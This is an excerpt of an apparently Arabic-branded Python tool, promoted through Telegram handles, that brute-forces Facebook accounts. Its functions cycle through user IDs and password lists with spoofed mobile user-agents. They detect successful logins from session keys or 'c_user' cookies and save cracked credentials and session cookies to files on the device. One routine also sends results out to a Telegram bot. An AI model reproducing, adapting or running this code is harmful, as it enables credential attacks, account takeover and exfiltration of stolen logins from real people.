...
if now >=target:print("سفاح  سفاح ﺪﻨﻋ ةﺍﺩﺍ ﻲﻓ كﺍﺮﺘﺷﻻﺍ ﻚﻨﻜﻤﻳ ةﺍﺩﺍ ﻒﻗﻮﺗ ﺪﻨﻋ مﺎﻀﻧ♕سفاح♕ ")
...
\x1b[1;36m{+} \x1b[1;33m𝙎pam   \x1b[1;33m: \x1b[1;33m سفاح
\x1b[1;36m{+} \x1b[1;35mسفاح V«1» 🤞🏻🔥  \x1b[1;35m: https://t.me/ABU_HARBA
...
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ سفاح ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/سفاح.txt \033[0;97m\n')
        #100010138361148
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mسفاح\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''@TTL9T
\r{G7}𝙶𝙾𝙾𝙳 ✔	‌🇴‌🇰
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ سفاح ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
    ⱰΑΤЄ  «   \x1b[1;94m{tahun(ids)}
ᯓᯓᯓᯓᯓ كہؤكہيہز ᯓᯓᯓᯓᯓ
	     •  كہؤكہيہز : {kuki}
	     ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : ادات سفاح - @TTL9T
				''')
	  ...
	  ᯓᯓᯓᯓᯓ كہؤكہيہز ᯓᯓᯓᯓᯓ
	    ...
	    • 𝙱𝚈 : @TTL9T - سفاح
				...
				'''
                                ...
                                open('/sdcard/سفاح-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/سفاح-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ﺏﺎﺴﺤﻟﺍ ﺀﺎﺸﻧﺍ ﺦﻳﺭﺎﺗ « \x1b[1;94m{tahun(ids)}
	  ...
	  ᯓᯓᯓᯓᯓ سفاح ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : سفاح - سفاح
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/سفاح-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [سفاح] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ سفاح ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @TTL9T - سفاح
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [سفاح-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/سفاح-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [سفاح-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/سفاح-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/سفاحCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [سفاح-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/سفاح-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/سفاح_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [سفاح-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/سفاح-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
